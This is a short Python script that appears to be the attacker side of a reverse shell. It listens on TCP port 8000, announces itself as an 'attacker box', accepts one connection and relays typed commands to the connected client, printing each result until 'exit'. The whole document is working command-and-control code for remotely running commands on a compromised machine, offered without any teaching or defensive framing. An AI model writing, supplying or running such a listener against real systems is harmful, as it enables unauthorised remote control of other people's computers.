from socket import *

# Define server port
server_port = 8000

# Create an IPv4 TCP socket
server_socket = socket(AF_INET, SOCK_STREAM)

# Enable address reuse
server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# Bind the socket to all available interfaces on the specified port
server_socket.bind(('', server_port))

# Start listening for incoming connections
server_socket.listen(1)
print("Attacker box listening and awaiting instructions")

# Accept a connection from a client
connection_socket, addr = server_socket.accept()
print("Thanks for connecting to me, " + str(addr))

# Receive the initial message from the client
message = connection_socket.recv(1024).decode()
print("Message from client:", message)

# Initialize the command variable
command = ""

# Command execution loop
while command != "exit":
    # Prompt the attacker to input a command
    command = input("Please enter a command: ")
    # Send the command to the client
    connection_socket.send(command.encode())
    # Receive and print the result of the command execution
    message = connection_socket.recv(1024).decode()
    print("Response from client:", message)

# Cleanly shutdown the connection
connection_socket.shutdown(SHUT_RDWR)
connection_socket.close()
print("Connection closed.")
